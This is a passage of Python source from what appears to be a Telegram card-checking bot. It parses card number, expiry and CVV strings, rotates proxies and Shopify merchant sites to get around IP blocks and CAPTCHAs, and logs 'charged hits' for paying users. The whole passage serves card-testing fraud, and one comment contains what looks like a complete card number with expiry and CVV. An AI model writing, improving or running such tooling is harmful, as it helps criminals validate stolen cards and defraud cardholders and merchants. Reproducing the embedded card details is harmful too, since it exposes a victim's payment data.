        current_time = time.time()
        if proxy not in self.failed_proxies:
            self.failed_proxies[proxy] = {
                'fail_count': 0,
                'first_fail': current_time,
                'last_fail': current_time,
                'cooldown_until': 0
            }
        fail_data = self.failed_proxies[proxy]
        fail_data['fail_count'] += 5  # jump the ladder to the top
        fail_data['last_fail'] = current_time
        fail_data['cooldown_until'] = current_time + cooldown_seconds
        logging.warning(
            f"[ProxyManager] HARD proxy failure — DEAD for {cooldown_seconds}s: "
            f"{mask_proxy(proxy)} | Response: {api_response[:80]}"
        )

    def report_result(self, proxy: str, api_response: str, http_status: Optional[int] = None):
        current_time = time.time()

        if self.is_real_proxy_error(api_response, http_status):
            if proxy not in self.failed_proxies:
                self.failed_proxies[proxy] = {
                    'fail_count': 0,
                    'first_fail': current_time,
                    'last_fail': current_time,
                    'cooldown_until': 0
                }

            fail_data = self.failed_proxies[proxy]
            fail_data['fail_count'] += 1
            fail_data['last_fail'] = current_time

            fail_count = fail_data['fail_count']
            cooldown_multipliers = [15, 30, 60, 120, 180, 300, 600]
            multiplier_index = min(fail_count - 1, len(cooldown_multipliers) - 1)
            cooldown_duration = cooldown_multipliers[multiplier_index]



            fail_data['cooldown_until'] = current_time + cooldown_duration

            logging.warning(
                f"[ProxyManager] Proxy FAILED (real error): {mask_proxy(proxy)} "
                f"(#{fail_count}) Cooldown: {cooldown_duration}s | Response: {api_response[:80]}"
            )
        else:
            self.report_success(proxy)
            logging.debug(
                f"[ProxyManager] Proxy OK: {mask_proxy(proxy)} | "
                f"Response: {api_response[:60]}"
            )

    def get_stats(self) -> dict:
        active_count = len([p for p in self.all_proxies if p not in self.failed_proxies])
        failed_count = len(self.failed_proxies)

        return {
            'total_proxies': len(self.all_proxies),
            'active': active_count,
            'failed': failed_count,
            'total_uses': self.total_uses,
            'success_distribution': dict(self.success_counts)
        }

    def get_available_count(self) -> int:
        current_time = time.time()
        available = 0
        for proxy in self.all_proxies:
            if proxy in self.failed_proxies:
                if current_time >= self.failed_proxies[proxy].get('cooldown_until', 0):
                    available += 1
            else:
                available += 1
        return available


def mask_proxy(proxy: str) -> str:
    try:
        if '@' in proxy:
            parts = proxy.split('@')
            if len(parts) == 2:
                addr = parts[1]
                return f"***@{addr}"
        return proxy[:15] + "***" if len(proxy) > 15 else "***"
    except:
        return "***"

def build_user_link(user_obj) -> str:
    """
    Returns a properly clickable HTML hyperlink for the user.
    Uses https://t.me/username when username is available (works in all groups).
    Falls back to tg://user?id= for users without a username.
    Name is HTML-escaped to prevent Telegram parse errors with special characters.
    """
    name = html_escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{html_escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'


def _sanitize_plan_name(plan_name: str) -> str:
    """
    Strip <tg-emoji ...> wrappers from plan_name, keeping the inner text
    (the fallback emoji like ⭐ / 👑 / 🛠️).

    Why: plan names set by admin via /sub contain custom-emoji HTML tags
    (e.g. "Super <tg-emoji emoji-id='5247131412032670246'>⭐</tg-emoji>").
    Those custom emoji IDs are only valid for the bot/user that created
    them. If the bot doesn't own/subscribe to that emoji set, Telegram
    rejects the ENTIRE message with "Invalid custom emoji identifier
    specified" — dropping the charge DM, the hit-log group post, AND
    the extra-charged group post. This helper converts the custom-emoji
    tags to their plain-text fallback so the message always sends.
    """
    if not plan_name:
        return ""
    return re.sub(
        r'<tg-emoji\s+emoji-id=["\'][^"\']+["\']>(.*?)</tg-emoji>',
        r'\1',
        str(plan_name),
        flags=re.IGNORECASE,
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD EXTRACTION FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})$',
        r'^(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})$',
        r'^(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})$',
        r'^(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})$',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
    ]

    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            groups = match.groups()
            if len(groups) == 5 and pattern.startswith(r'^\/[a-zA-Z]+\s+'):
                cc, mm, yy, cvv = groups[1], groups[2], groups[3], groups[4]
            elif len(groups) == 4:
                cc, mm, yy, cvv = groups
            else:
                continue
            month = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            return cc, month, yy, cvv
    return None

def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s\|\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s(\d{1,2})\/(\d{2,4})\s(\d{3,4})',
    ]
    cards = []
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            if len(match) == 4:
                card_number, month, year, cvv = match
                month = month.zfill(2)
                if len(year) == 4:
                    year = year[2:]
                card_string = f"{card_number}|{month}|{year}|{cvv}"
                if card_string not in cards:
                    cards.append(card_string)
    return cards

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _run_bg_db(coro_factory):
    """
    Wraps a fire-and-forget DB write with error handling so that any
    unhandled exception is logged instead of producing
    "Task exception was never retrieved" warnings on the event loop.
    """
    try:
        await coro_factory()
    except Exception as e:
        logging.error(f"[MSH] background DB write failed: {e}")


def log_hit_to_mshh(user_id, username, first_name):
    """
    Log a charged hit to MongoDB Atlas (collection: charged_hits).
    Atlas is cloud-hosted so this data survives VPS redeploys —
    the previous mshh.txt file was wiped every time the bot was updated.
    """
    try:
        add_charged_hit(user_id, username, first_name)
    except Exception as e:
        logging.error(f"Error logging charged hit for {user_id}: {e}")

# ══════════════════════════════════════════
# RETRY ERRORS - Site/Step Issues (Retry with NEW SITE)
# ══════════════════════════════════════════
# These messages mean the site/checkout itself failed — NOT the
# card, NOT the proxy. We rotate to a different site and try again.
#
# IMPORTANT: keep these patterns SPECIFIC to checkout/site failures.
# A bare substring like "error" is NOT in this list because it would
# over-match unrelated messages. Site-error patterns should mention
# checkout / site / payment / token / etc.
RETRY_ERRORS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site not supported for now!',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed',
    'token not found', 'invalid_response', 'resolve', 'item', 'curl error',
    'could not resolve host', 'connect tunnel failed',
    'timeout', 'proxy error',

    # Site / checkout errors — NOT a real card decline. Try another site.
    # Caught the user-reported card 4240090003774430|06|29|553 which used
    # to be short-circuited to "ERROR" status with zero retries.
    'an error occurred during the checkout',
    'an error occurred during checkout',
    'error occurred during the checkout',
    'error occurred during checkout',
    'error during checkout',
    'checkout error',
    'checkout failed',
    'checkout process',
    'payment processing error',
    'payment error',
    'unable to process payment',
    'unable to complete checkout',
    'unable to complete the checkout',
    'unable to complete the order',
    'unable to place order',
    'internal checkout error',
    'internal server error',
    'store error',
    'shop error',
    'merchant error',
    'gateway error',
    'processing error',
    'transaction error',
    'order error',
    'cart error',

    # Shopify cart-state delivery glitches — fire when the cart's delivery
    # line detail changes between cartCreate and the subsequent
    # cartPaymentUpdate (concurrent checkouts on the same merchant race
    # each other's rate cache). Transient in 95% of cases: rotating to a
    # fresh site/proxy usually succeeds because the new merchant state is
    # untouched. Treated as a retryable site/index cache conflict below.
    'delivery delivery line detail changed',
    'delivery line detail changed',
    'delivery line changed',
    'cart line changed',

    # Billing-clash errors — MISMATCHED_BILL / BILL_MISMATCH fire on
    # Shopify's billing step (cartCreate succeeded, then cartPaymentUpdate
    # rejected because of a `price=` hint or a stale expected-amount).
    # The bot's reload of `process_card_api` already retries these 5x in-
    # process with `price_hint=None` (let API use natural cart total). For
    # cases where the merchant itself is misconfigured, the only way out
    # is to rotate to a fresh site+proxy — so we ALSO trigger outer-loop
    # site/proxy rotation here. Per-card the outer loop gets up to
    # MAX_RETRIES (=5) fresh attempts.
    'mismatched bill',
    'mismatched_bill',
    'bill mismatch',
    'bill_mismatch',
    'mismatched amount',
    'mismatched_amount',
    'mismatched total',
    'mismatched_total',

    # Proxy-blocked / payments-API / submit errors — when these
    # responses come back from the merchant (or from the bot-side JSON
    # adapter), the only guaranteed fix is a fresh site+proxy
    # combination:
    #   • `<b>Proxied IP Blocked - Try Different Proxy</b>` — explicit
    #     gateway signal that the proxy's exit IP is blocked at this
    #     storefront. Rotating to a NEW proxy (NOT just same one) is the
    #     only fix; we rotate both site+proxy to maximise hit rate.
    #   • `PAYMENTS_POSITIVE_AMOUNT_EXPECTED` — Shopify payments validator
    #     rejected the cart total (e.g. sale price set to 0 or negative
    #     because of stale merchant config). Site rotation usually picks
    #     a different merchant total.
    #   • `PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH` — merchant has
    #     multiple payment-flexibility configurations and our cached
    #     terms ID is wrong for this storefront. Different merchant →
    #     usually different config.
    #   • `MERCHANDISE_EXPECTED_PRICE_MISMATCH` — handled in-process by
    #     the remote API's own scraping + `_PRICE_MISMATCH_KW` retry, but
    #     on merchant-specific config decay the inner retry can't fix it
    #     and we MUST rotate site. Without this entry, the inner loop
    #     burns 5 attempts at the same merchant and gives up.
    #   • `No valid payment method found` — Shopify storefront signals
    #     that none of the merchant's payment gateways could accept the
    #     cart (region/currency mismatch, gateway outage, or our cart
    #     shape is wrong). Rotating site rotates to a merchant whose
    #     payment methods list still has an active gateway.
    #   • `Transient API Submit Error` (the friendly form our own
    #     `_RESPONSE_REMAP` substitutes for noisy raw snippets like
    #     `Invalid JSON in submit response: GraphQL Error aft...`) —
    #     transient client/transport glitch that almost always clears
    #     on a fresh connection.
    #
    # Outer loop MAX_RETRIES=10 means each card gets up to 10 fresh
    # site+proxy attempts under these conditions, then falls through
    # to generic ERROR classification.
    'proxied ip blocked',
    'proxied ip blocked - try different proxy',
    'payments_positive_amount_expected',
    'payments_payment_flexibility_terms_id_mismatch',
    'merchandise_expected_price_mismatch',
    'no valid payment method',
    'no valid payment method found',
    'transient api submit error'

    # API client-side parsing failures — the bot's reverse-proxy adapter
    # couldn't decode the merchant response body during the submit step.
    # Usually transient (proxy flapping, Shopify mid-deploy response,
    # partial streaming). Rotating to a fresh proxy/site clears the
    # connection state and usually succeeds on the next try.
    'invalid json in submit response',
    'graphql error after',
    'graphql error in submit',
    'graphql error: ',
    'invalid json response',
    'invalid json from submit',
    'json decode error',
    'json parse error',

    'step 0 failed',
    'step 1 failed',
    'step 2 failed',
    'step 3 failed',
    'step 4 failed',
    'step 5 failed',
    'step 6 failed',
    'step 7 failed',
    'step 8 failed',
    'step 9 failed',
    'step 10 failed',

    'no available products found',
    'could not extract receiptid',
    'could not extract signedhandles',
    'receiptid missing',
    'response missing receiptid',
    'products.json',
    'returned status 429',
    'returned status 500',
    'returned status 502',
    'returned status 503',
    'returned status 504',
    'store incompatible',
    'extract signedHandles',
    'missing receiptId',

    # ── ADMIN-REQUESTED 10-RETRY PATTERNS ─────────────────────────
    # These 3 specific gateway responses get up to MAX_RETRIES=10
    # site+proxy rotations before final classification. Removed from
    # DECLINED_RESPONSES above so they route here for retries.
    # Original message is preserved verbatim in the user's .txt report
    # (no friendly remap) so admins can see the exact response.

    # 1) Invalid address line 1 — Shopify checkout rejects cards when
    #    the merchant's address form rejects the address the API submits.
    #    Rotating to a different site/proxy usually finds a merchant
    #    with a less strict address validator, or picks up a different
    #    billing-region form that doesn't trip the validator.
    'invalid address line 1',
    'invalid address line',
    'update to proceed checkout',

    # 2) PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED — Shopify's payments
    #    validator refused the card brand at the merchant's gateway config.
    #    Different merchant (rotated site) usually has different brand
    #    support set, or accepts the brand on a different processor.
    'payments_credit_card_brand_not_supported',
    'payments credit card brand not supported',
    'credit card brand not supported',
    'card brand not supported',

    # 3) INVALID_PURCHASE_TYPE — Shopify gateway rejected the purchase
    #    type (recurring vs one-time). Different merchant usually
    #    accepts the purchase type the card is configured for.
    'invalid_purchase_type',
    'invalid purchase type',

# 4) ORDER_TOTAL_CHANGED — Shopify cartCreate → cartPaymentUpdate
    #    race: the merchant's cart total shifted between the two steps
    #    (concurrent checkouts, sale price flash, or rate cache stale).
    #    Same root cause as DELIVERY_DELIVERY_LINE_DETAIL_CHANGED —
    #    rotating to a fresh merchant (site) picks up a stable cart
    #    whose total doesn't move mid-checkout. Retried up to
    #    MAX_RETRIES=10 site+proxy rotations per admin request.
    'order_total_changed',
    'order total changed',
    'total_changed',
    'total changed',

    # ── ShopifyApi/api.py — additional retryable False responses ──
    # The API server (C:\Users\ASUS\Desktop\ShopifyApi\api.py) returns
    # these on proxy / site / merchant-state glitches. Without these in
    # RETRY_ERRORS, Rukia short-circuits to ERROR and skips up to 10
    # site+proxy rotations that would normally recover the charge.
    'captcha_required',                       # submit/delivery CAPTCHA
    'session is null',                        # GraphQL session = None
    'negotiate returned null',                # Negotiate payload empty
    'result is null',                         # Negotiate.result missing
    'checkpoint denied',                      # Shopify auth checkpoint
    'throttled',                              # merchant rate limit
    'no data in proposal response',           # proposal JSON empty
    'seller proposal is null',                # proposal missing sellerProposal
    'no runningtotal in sellerproposal',      # cart total missing
    'zero_price_product',                     # cart created with $0
    'no delivery data in proposal',           # proposal missing delivery
    'unable to get payment token',            # payment token fetch failed
    'payment method not available',           # merchant has no working gateway
    'empty submit response',                  # submit data is null
    'submitsuccess but no receipt',           # SubmitSuccess without receipt
    'submit rejected',                        # SubmitRejected
    'no receipt in submit response',          # submit payload missing receipt
    'no receipt id',                          # receipt without id
    'change proxy or site',                   # api.py hint — proxy/site issue
    'unknown result',                         # api.py couldn't classify
    'cart failed with status',                # cartCreate HTTP error
] 


# ━━━ AUTO-REMOVE DEAD SITES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# When a /msh worker hits any of these response patterns, the SITE itself
# is permanently broken for the bot — not a card decision, not a proxy
# issue. We auto-remove the site from sites.txt AND from the current
# session's sites_list cache so:
#   1. The current /msh session immediately skips it for remaining cards.
#   2. Future /msh sessions don't waste retries on the same dead site.
#
# Patterns matched case-insensitively (substring match).
_AUTO_REMOVE_SITE_PATTERNS = (
    "site not supported",
    "empty submit response",
    "validation_custom",
    "site error! status: 401",
)

# Per-process set + lock — when N workers all hit the same dead site in
# the same session, only ONE actually writes to sites.txt. The rest see
# the URL already in _sites_being_removed and bail.
_sites_being_removed: set = set()
_sites_being_removed_lock = asyncio.Lock()


async def _remove_dead_site_from_file(site_url: str) -> None:
    """
    Remove a single URL line from sites.txt (best-effort, in background).

    Runs the actual file I/O in a worker thread so the event loop is
    not blocked. Per-process dedup via _sites_being_removed prevents
    the same URL triggering N concurrent file rewrites when 20 workers
    all hit the same dead site.
    """
    if not site_url:
        return
    async with _sites_being_removed_lock:
        if site_url in _sites_being_removed:
            return
        _sites_being_removed.add(site_url)
    try:
        def _sync_remove():
            try:
                if not os.path.exists(SITES_FILE):
                    return False
                with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
                    lines = f.readlines()
                filtered = [ln for ln in lines if ln.strip() != site_url]
                if len(filtered) == len(lines):
                    return False
                with open(SITES_FILE, "w", encoding="utf-8") as f:
                    f.writelines(filtered)
                return True
            except Exception as e:
                logging.error(f"[MSH] failed to remove dead site from file: {e}")
                return False
        removed = await asyncio.to_thread(_sync_remove)
        if removed:
            logging.warning(
                f"[MSH] Auto-removed dead site from sites.txt: {site_url}"
            )
    finally:
        async with _sites_being_removed_lock:
            _sites_being_removed.discard(site_url)


# ━━━ DECLINED_RESPONSES (module-level — referenced from msh display
# classifier, generate_result_file, etc. when categorising card-check
# outputs. Module-level so all functions can access it without scoping
# issues when generating txt reports.)
DECLINED_RESPONSES = [
    'CARD_DECLINED', 'CARD DECLINED',
    'PROCESSING_ERROR', 'PROCESSING ERROR',
    'GENERIC_ERROR', 'GENERIC ERROR',
    'GENERIC_DECLINE', 'GENERIC DECLINE',
    'DO NOT HONOR', 'DO_NOT_HONOR',
    # NOTE: 'UNKNOWN_ERROR' / 'UNKNOWN ERROR' / 'Processing Error' intentionally
    # REMOVED. Those are bot-level defaults (the API returns them when it
    # couldn't read a real gateway response). Treating them as gateway
    # declines (DECLINED ❌) hid real infrastructure failures. They now
    # fall through to the ERROR ⚠️ branch in the display classifier
    # because they contain 'error' / 'ERROR' substrings.
    # 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED' and
    # 'MERCHANDISE_EXPECTED_PRICE_MISMATCH' are explicit gateway-level
    # declines (sale mismatch / currency / dynamic pricing); kept above.
    'PICK_UP_CARD', 'PICK UP CARD', 'DECISION_RULE_BLOCK', 'DECISION RULE BLOCK',
    'FRAUD_SUSPECTED', 'FRAUD SUSPECTED', '3DS_REQUIRED', '3DS REQUIRED',
    # NOTE: INVALID_PURCHASE_TYPE and PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED
    # moved OUT of DECLINED_RESPONSES — they now route through RETRY_ERRORS
    # for 10 site+proxy rotations before final classification (admin request:
    # retry these specific gateway responses 10 times on different sites/proxies
    # before declaring dead).
    'INVALID_PAYMENT_METHOD', 'INVALID PAYMENT METHOD',
    'TEST_MODE_LIVE_CARD', 'TEST MODE LIVE CARD',
    'AMOUNT_TOO_SMALL', 'AMOUNT TOO SMALL',
    'INCORRECT_NUMBER', 'INCORRECT NUMBER',
    'EXPIRED_CARD', 'EXPIRED CARD',
    # New API-specific declined patterns (only ones NOT covered by the
    # 10-retry rule above). PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED
    # variants moved to RETRY_ERRORS so they get 10 site/proxy rotations.
    # 'CREDIT CARD BRAND', 'CREDIT_CARD_BRAND',
    # 'BRAND IS NOT SUPPORTED', 'BRAND_NOT_SUPPORTED',
    # 'CARD NOT SUPPORTED', 'CARD_NOT_SUPPORTED',
    # 'CARD BRAND',
    # Admin-requested hard-coded declines — these are GATEWAY-level outcomes
    # (sale/currency mismatch, post-checkout delivery detail changes) that
    # should ALWAYS render as DECLINED ❌ in the txt file, never as
    # ERROR ⚠️. They mean "card declined at merchant", NOT "bot/network
    # failed". Substring match in display classifier does `_` → ` ` so
    # both forms match.
    'DELIVERY DELIVERY LINE DETAIL CHANGED',
    'MERCHANDISE EXPECTED PRICE MISMATCH',
    # Shopify fraud/risk score decline — the merchant's risk engine
    # flagged the card/checkout as too risky. This is a GATEWAY-level
    # decline (card was refused), NOT a bot/network error. Without this
    # entry, "RISKY" fell through every classification branch and ended
    # up in error_cards (⚠️) instead of dead_cards (❌).
    'RISKY',
]


REACTIONS = [
    "airkiss", "blush", "brofist", "celebrate", "cheers", "clap",
    "cool", "cuddle", "dance", "handhold", "happy", "hug",
    "kiss", "laugh", "lick", "love", "nervous", "nom",
    "nuzzle", "nyah", "pat", "peek", "shy", "sip",
    "sleep", "smile", "smug", "sorry", "thumbsup",
    "tickle", "tired", "wave", "wink", "yay", "yes"
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ANIME GIF LRU CACHE
# Previously get_anime_gif() made an external HTTP call to
# api.otakugifs.xyz for EVERY approved/charged hit. With 15 concurrent
# users and many hits, that became its own bottleneck (external latency,
# rate limits, occasional 5xx). Now we cache the last GIF URLs and reuse
# them across hits (random pick from the cache). Misses still fetch
# fresh URLs in the background to grow the pool.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_ANIME_GIF_CACHE: list = []
_ANIME_GIF_CACHE_MAX = 12
_ANIME_GIF_CACHE_LAST_FILL_MONO: float = 0.0
_ANIME_GIF_FALLBACK_URL = (
    "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z6eXF6eXF6eXF6eXF6eXF6SZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/"
    "LdOyjZ7h5xS3yCjQ8I/giphy.gif"
)
_ANIME_GIF_CACHE_TTL_S = 1800.0  # refill the cache every 30 minutes


async def _refill_anime_gif_cache() -> None:
    """Fetch a batch of fresh anime GIF URLs in parallel (best-effort)."""
    global _ANIME_GIF_CACHE_LAST_FILL_MONO
    if not REACTIONS:
        return
    picks = random.sample(REACTIONS, k=min(6, len(REACTIONS)))
    fetched: list = []

    async def _fetch_one(reaction: str) -> Optional[str]:
        url = f"https://api.otakugifs.xyz/gif?reaction={reaction}"
        try:
            sess = await _get_msh_http_session()
            async with sess.get(url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    u = data.get("url")
                    return u if isinstance(u, str) and u else None
        except Exception as e:
            logging.debug(f"[gif-cache] fetch failed for {reaction}: {e}")
        return None

    try:
        results = await asyncio.gather(*[_fetch_one(r) for r in picks])
        for u in results:
            if u and u not in fetched and u not in _ANIME_GIF_CACHE:
                fetched.append(u)
    except Exception as e:
        logging.debug(f"[gif-cache] refill error: {e}")

    if fetched:
        for u in fetched:
            if len(_ANIME_GIF_CACHE) >= _ANIME_GIF_CACHE_MAX:
                _ANIME_GIF_CACHE.pop(0)
            _ANIME_GIF_CACHE.append(u)
        _ANIME_GIF_CACHE_LAST_FILL_MONO = time.monotonic()
        logging.debug(f"[gif-cache] added {len(fetched)} new URLs (pool={len(_ANIME_GIF_CACHE)})")


async def get_anime_gif():
    """
    Returns a usable anime GIF URL. Uses the in-memory LRU cache so we
    don't hit api.otakugifs.xyz on every hit (15 users × many hits would
    otherwise hammer the upstream). Cache refills lazily every 30 minutes.
    """
    now = time.monotonic()
    cache_stale = (
        not _ANIME_GIF_CACHE
        or (now - _ANIME_GIF_CACHE_LAST_FILL_MONO) > _ANIME_GIF_CACHE_TTL_S
    )
    if cache_stale:
        # Fire-and-forget refill; if it fails we still serve from cache
        # (or the hardcoded fallback) on this call.
        asyncio.create_task(_refill_anime_gif_cache())

    if _ANIME_GIF_CACHE:
        return random.choice(_ANIME_GIF_CACHE)
    return _ANIME_GIF_FALLBACK_URL

def is_session_stopped(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return True
    return session.get('status') == "STOPPED"

def is_buttons_locked(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session: return False
    elapsed = time.time() - session.get('start_time', 0)
    return elapsed < BUTTON_LOCK_SECONDS

def get_remaining_lock(session_id: str) -> int:
    session = MSH_SESSIONS.get(session_id)
    if not session: return 0
    elapsed = time.time() - session.get('start_time', 0)
    remaining = BUTTON_LOCK_SECONDS - elapsed
    return max(0, int(remaining) + 1)

async def get_user_plan_name(user_id):
    # Admin always shows ULTIMATE — even if their is_premium flag is 0
    # (e.g. when an admin account has no /sub receipt in DB).
    if user_id in ADMIN_IDS:
        return "ULTIMATE"
    is_premium, _ = get_premium_status(user_id)
    if is_premium:
        try:
            def _sync_fetch():
                col = get_collection("receipts")
                r = col.find_one({"user_id": user_id}, sort=[("purchased_on", -1)])
                if r and r.get("plan"):
                    return str(r["plan"]).upper()
                return "NO PLAN"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "NO PLAN"
    else:
        return "NO PLAN"

async def get_user_proxies(user_id):
    proxies = []
    try:
        def _sync_fetch():
            col = get_collection("proxies")
            docs = list(col.find({"user_id": user_id}, {"proxy": 1, "_id": 0}))
            return [d["proxy"] for d in docs if "proxy" in d]
        proxies = await asyncio.to_thread(_sync_fetch)
    except Exception as e:
        logging.error(f"Error fetching proxies for user {user_id}: {e}")
    if not proxies:
        proxies = load_global_proxies()
    return proxies

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    reverse_digits = card_number[::-1]
    for i, char in enumerate(reverse_digits):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        current_date = datetime.now()
        current_year = current_date.year % 100
        current_month = current_date.month
        exp_year = int(yy)
        exp_month = int(mm)
        if exp_year < current_year:
            return True
        elif exp_year == current_year:
            if exp_month < current_month:
                return True
        return False
    except ValueError:
        return True

def get_sites():
    sites = []
    try:
        if os.path.exists(SITES_FILE):
            with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
                sites = [line.strip() for line in f if line.strip()]
    except Exception as e:
        logging.error(f"Error reading sites.txt: {e}")
    return sites

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GLOBAL ROUND-ROBIN SITE DISTRIBUTION
# When 15-30 users run /msh concurrently (each spinning up to 100 workers),
# picking the next site via random.choice() can concentrate check-volume
# onto a small subset of sites — those sites get hammered to death within
# minutes while the rest sit idle, causing chain site-dead failures for
# everyone. Round-robin spreads check-volume evenly across the entire
# sites.txt list regardless of how many sessions are running: every call
# to _next_site_round_robin() advances the cursor by exactly 1, so with
# N sites and M concurrent picks, each site gets picked exactly M/N
# times (rounded). The cursor is a module-level int — safe to mutate
# without locks because asyncio is single-threaded.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_SITE_ROUND_ROBIN_COUNTER: int = 0

def _next_site_round_robin(sites_list: List[str], used_sites: set) -> Optional[str]:
    """
    Pick the next site via GLOBAL round-robin (shared across ALL /msh
    sessions). Always advances the cursor, so even if the candidate
    at the current index is in `used_sites` (because this card already
    tried it on a previous retry), we move on — preventing any single
    "fresh for this card" site from being handed back to back to two
    parallel workers from different cards.
    Returns None only if sites_list is empty.
    """
    global _SITE_ROUND_ROBIN_COUNTER
    if not sites_list:
        return None
    n = len(sites_list)
    for _ in range(n):
        idx = _SITE_ROUND_ROBIN_COUNTER % n
        candidate = sites_list[idx]
        _SITE_ROUND_ROBIN_COUNTER = (idx + 1) % n
        if candidate not in used_sites:
            return candidate
    # No unused candidate: sites_list tiny & all in used_sites (this card
    # retried up to MAX_RETRIES = 6 times on N<=5 sites). Just grab what
    # the cursor currently points to — caller already passed available
    # fallback via available_sites so this edge case is rare.
    return sites_list[_SITE_ROUND_ROBIN_COUNTER % n]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GLOBAL ROUND-ROBIN PROXY OFFSET
# Same idea as sites, but for proxies: when 20 users start /msh
# sessions at nearly the same moment, each ProxyManager() instance
# would otherwise initialise its deque from the SAME proxy[0]
# (since set() doesnt preserve order and dict iteration is stable
# per-process so raw_proxies likely lands in the same order for the
